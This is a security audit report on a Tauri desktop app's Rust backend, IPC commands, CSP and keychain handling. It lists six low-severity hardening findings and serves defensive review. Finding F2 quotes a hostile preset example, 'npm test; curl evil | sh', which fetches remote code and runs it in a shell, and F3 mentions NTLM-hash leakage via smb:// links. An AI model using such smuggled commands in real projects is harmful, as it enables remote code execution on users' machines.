# Saple Bridge - Security Audit Report

**Date:** 2026-07-14
**Scope:** Tauri 2 desktop app (`saple-bridge`) - Rust backend (`src-tauri/src/*`), IPC command surface, Tauri config/capabilities/CSP, and the React renderer's injection surface.
**Out of scope:** the `../saple-mcp` sidecar crate (sibling project), third-party CLI agents, `node_modules`/`target` build output.

---

## 1. Executive summary

Saple Bridge is a **hardened, security-conscious codebase**. Security was clearly treated as a first-class design concern: every renderer→Rust command validates its inputs, path containment is enforced with symlink-aware canonicalization, secrets never cross the IPC boundary, shell interpolation is avoided or tightly allowlisted, and the CSP is strict.

**No critical or high-severity vulnerabilities were found.** I found **no** command injection, **no** path traversal, **no** secret leakage over IPC, and **no** XSS vector in the renderer. The findings below are defense-in-depth hardenings and residual risks tied to two *intentional* trust boundaries, not exploitable bugs in the current shipping configuration.

| # | Finding | Severity | Type |
|---|---------|----------|------|
| F1 | `project_path` is fully renderer-controlled; FS commands contain only the *relative* `file_path`, not the root | Low (hardening) | Blast-radius / defense-in-depth |
| F2 | Review verification presets are project-file-sourced and execute a shell verbatim | Low | Intentional trust boundary + social engineering |
| F3 | `openUrl` scheme allowlist is app-level only; opener capability is unscoped at the manifest | Low | Defense-in-depth |
| F4 | Verification-command timeout kill does not reap the child process tree (Windows) | Info | Robustness |
| F5 | Cross-process write lock proceeds unlocked on timeout / sentinel failure | Info | Data integrity (documented) |
| F6 | Provider API keys live in child-process environments during agent runs | Info | Inherent to design |

---

## 2. Threat model

For a local-first Tauri app, the security model rests on three boundaries:

1. **Renderer → Rust IPC.** The React renderer is *trusted* only because it loads exclusively local, first-party content under a strict CSP with no remote origins and no raw-HTML rendering. If that assumption ever breaks (an XSS, a future remote iframe/preview panel, a malicious dependency), a compromised renderer inherits the full IPC surface - which includes **two RCE-capable commands** (`spawn_pty` with `custom_command`, and `run_verification_command`). This makes the renderer's integrity load-bearing, and is why the defense-in-depth findings below matter.
2. **Project directory as semi-untrusted data.** A user may open a project authored by someone else (cloned repo, shared workspace). Anything read from `.saple/*`, memory markdown, tasks, or swarm state must be treated as attacker-influenced. The code does this well: path containment everywhere, YAML-injection-safe frontmatter, markdown rendered without raw HTML.
3. **Secrets.** API keys in the OS keychain must never reach the renderer or be written to disk in cleartext.

The audit evaluated each boundary. The renderer boundary is where the residual risk concentrates.

---

## 3. What the codebase does right (verified)

These are load-bearing controls I confirmed are correctly implemented - worth preserving through future changes:

- **Strict CSP** (`tauri.conf.json`): `default-src 'self'`; `script-src 'self' 'wasm-unsafe-eval'` (no `unsafe-eval`); `connect-src 'self' ipc:` (renderer cannot exfiltrate over the network); `img-src` without arbitrary `https:` (blocks markdown-image beacon exfil); `object-src 'none'`; `base-uri 'self'`; `frame-ancestors 'none'`. The only softening is `style-src 'unsafe-inline'`, which is low-risk absent script injection.
- **No XSS surface.** No `dangerouslySetInnerHTML`, `innerHTML`, `eval`, or `new Function` anywhere in `src/`. Markdown is rendered with `react-markdown` **without `rehype-raw`**, so untrusted note/file content cannot inject markup (`MarkdownPreview.tsx`, `MemoryMarkdown.tsx`).
- **Keychain hygiene** (`keychain.rs`): there is deliberately **no `get_api_key` IPC command**; keys are read only inside Rust (`get_api_key_inner`) at PTY launch. The renderer uses `has_api_key` / `test_provider_connection`, which return booleans. Service names are validated against the `saple_provider_<provider>_api_key` convention. `test_provider_connection` no longer clobbers the stored key with a sentinel.
- **Command-injection defense in `spawn_pty`** (`pty.rs`): provider is resolved through an **allowlist** (`provider_command`), model strings pass `is_safe_model` (rejects `"`, backtick, `$`, `\`, whitespace - exactly the chars that break a double-quoted shell string), prompt-file paths pass `validate_prompt_file` (forbidden metacharacters + project containment + must-exist), and Claude session UUIDs are shape-validated. All covered by unit tests including explicit injection attempts.
- **Git operations use argv exec, never a shell** (`git.rs`): file paths always follow `--` (pathspec, never parsed as an option), branch names reject leading `-`, commit messages go through `-m` argv. No quoting/injection concern.
- **Path traversal is thoroughly defended** (`project.rs::get_project_file_path`): rejects absolute paths and `..`/root/prefix components up front, then canonicalizes (resolving symlinks) and proves containment against the canonical base - for both existing targets and not-yet-created ones (canonicalizing the nearest existing ancestor *before* `create_dir_all`, defeating symlinked-parent tricks). Memory read/delete/save enforce their own memory-dir-scoped containment on top. All covered by traversal tests.
- **Model discovery is SSRF-safe** (`models.rs`): endpoints are hardcoded to official vendor URLs (not user-configurable), the key is read only in Rust, TLS via rustls, 6s timeout, and every failure path degrades silently to an empty list. The API key is the only thing that leaves the machine here, and only to its own vendor.
- **Minimal capability grant** (`capabilities/default.json`): only `core:default`, `opener:default`, `notification:default`, clipboard read/write, `updater:default`, `process:allow-restart`. **No `shell` or broad `fs` plugin** - all filesystem/process access goes through the explicit, validated Rust commands.
- **Signed auto-updates**: minisign public key + HTTPS GitHub release feed (standard Tauri updater). Store builds compile the updater out entirely.
- **YAML-injection-safe memory frontmatter** (`memory.rs::yaml_quote`): titles/tags/aliases are double-quoted and escaped so a crafted note can't inject frontmatter keys or terminate the `---` block. Tested with an explicit breakout attempt.
- **No committed secrets / `.env` files.** The only key in the repo is the updater *public* key (correct).

---

## 4. Findings and recommendations

### F1 - `project_path` is renderer-controlled; only `file_path` is contained *(Low, defense-in-depth)*

**Where:** every FS/exec command (`project.rs`, `files.rs`, `git.rs`, `review.rs`, `memory.rs`, `swarm.rs`, `control_plane.rs`).

**Observation:** the traversal defenses contain `file_path` **relative to `project_path`**, but `project_path` itself is accepted verbatim from the IPC caller and never checked against the set of workspaces the user actually opened. A caller that passes `project_path = "C:\"` (or any directory) gets read/write/exec scoped to *that* root. Combined with the two RCE-capable commands, a compromised renderer would have arbitrary-location file access and code execution.

**Why it's Low, not High:** in the current build the renderer cannot be driven by an attacker - strict CSP, no remote content, no XSS vector found. This is the standard Tauri trust model. The finding is about **blast radius**: the app currently has *zero* defense-in-depth if the renderer is ever compromised (future preview panel per plan P5, a dependency compromise, a missed XSS).

**Recommendation:** maintain an allowlist of opened workspace roots in Rust (populated when the user picks a folder via `select_directory` / opens from History) and validate every command's `project_path` against it. This bounds a hypothetical renderer compromise to the directories the user actually opened, and is a small, contained change since all commands already funnel through a few helpers.

---

### F2 - Verification presets are project-file-sourced and run a shell verbatim *(Low)*

**Where:** `review.rs::run_verification_command_inner` / `run_shell_with_timeout`; presets in `project.rs::WorkspaceConfig.verification_presets` (`.saple/config.json`).

**Observation:** `run_verification_command` executes `command_str` verbatim in PowerShell/`sh` inside the project dir. This is an **intentional, documented** trust boundary (the module comment explains it - review runs the user's own `npm test`/`cargo check`). The residual risk: the verification *presets* are read from the project's own `.saple/config.json`, so a shared or malicious project can pre-populate the dropdown with a command. A user who opens someone else's project and clicks a benign-looking preset (`npm test` that is actually `npm test; curl evil | sh`) could execute it.

**Existing mitigations (good, keep them):** operator-initiated only (never auto-run), the exact command is shown in the UI before running, working dir is the project, execution is time-boxed with truncated output.

**Recommendation:** in the Review UI, visually distinguish presets that came from the *project config* from the user's own presets, and render the fully-resolved command prominently (not truncated) at the moment of the Run click. This preserves the core dev-tool use case while defusing the "trusted-looking preset" social-engineering angle.

---

### F3 - `openUrl` scheme gate is app-level only; opener capability is unscoped *(Low, defense-in-depth)*

**Where:** `MemoryMarkdown.tsx`, `MarkdownPreview.tsx`, `useXtermSession.ts`; capability `opener:default`.

**Observation:** the renderer correctly gates external links to `^(https?:|mailto:)` before calling `openUrl`, and react-markdown strips `javascript:` on its own - so today's paths are safe. But the restriction lives entirely in app code; the `opener:default` capability does not constrain URL schemes at the manifest layer. Any future call site that forwards an untrusted URL to `openUrl` without the gate (or a renderer compromise calling it directly) could open `file://`, `smb://`, etc. - which can trigger NTLM-hash leaks or auto-open local handlers.

**Recommendation:** add an explicit opener scope in `capabilities/default.json` restricting `open-url` to `http`/`https`/`mailto` at the Tauri layer, so the manifest enforces what app code currently enforces alone (defense-in-depth).

---

### F4 - Verification-command timeout does not reap the process tree *(Info, robustness)*

**Where:** `review.rs::run_shell_with_timeout`.

**Observation:** on timeout, `child.kill()` terminates only the immediate `powershell.exe`/`sh`, not its descendants. Unlike the interactive PTY path (which uses a Windows Job Object with `KILL_ON_JOB_CLOSE`), a verification command that spawns a long-running child (a dev server, a watch) can leave orphaned processes after the 90s timeout. This is a resource/cleanup issue, not a security one.

**Recommendation:** low priority. If addressed, reuse the `proc_tree::JobObject` pattern from `pty.rs` for the verification child on Windows.

---

### F5 - Cross-process lock is best-effort and proceeds unlocked on failure *(Info, data integrity - documented)*

**Where:** `fs_lock.rs::with_cross_process_lock`.

**Observation:** the sentinel-file spinlock proceeds *without* the lock if it can't be acquired within 10s or the sentinel can't be created (e.g. a permission-constrained directory). Under heavy Bridge↔sidecar contention this reintroduces the lost-update race it exists to prevent. This is a deliberate, commented `ponytail:` shortcut with a stated upgrade path (real `LockFileEx`/`flock` in a shared crate). Data-integrity, not security.

**Recommendation:** none required now; revisit if concurrent-writer corruption is ever observed. The documented upgrade path is the right one.

---

### F6 - API keys live in child-process environments during agent runs *(Info, inherent)*

**Where:** `pty.rs::spawn_pty` (injects `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, etc. into the shell env).

**Observation:** the provider CLIs read their keys from environment variables, so the key necessarily leaves the keychain and lives in the agent subprocess's environment (readable by that process and its descendants, and by same-user processes on some OSes) for the run's duration. This is unavoidable given how the CLIs authenticate, and the injection is correctly scoped per provider (the legacy `openai_api_key` fallback is restricted to codex panes only, avoiding cross-provider key leakage). Documented here for completeness, not as a defect.

**Recommendation:** none. Optionally document this in the security/threat notes so it's a known, accepted property.

---

## 5. Prioritized action list

1. **F1** - Validate `project_path` against a Rust-side allowlist of opened workspaces. *Highest-value hardening: turns "renderer compromise = arbitrary FS + RCE" into "renderer compromise = opened-projects only."*
2. **F3** - Add a manifest-level opener scope (http/https/mailto). *Small, closes a latent gap.*
3. **F2** - Distinguish project-sourced verification presets in the Review UI and show the resolved command at click time.
4. **F4** - (Robustness) Reap the verification child's process tree on timeout.
5. **F5 / F6** - Accept and document; no action required.

## 6. Conclusion

The application's security posture is **strong**. The two RCE-capable commands are the correct, intended way for a local dev workspace to run agents and tests, and both are gated behind operator action and (for `spawn_pty`) strict input validation. The single most valuable improvement is **F1** - constraining `project_path` to opened workspaces - which would give the app meaningful defense-in-depth against any future renderer compromise, the one scenario where the current model has no second line of defense.
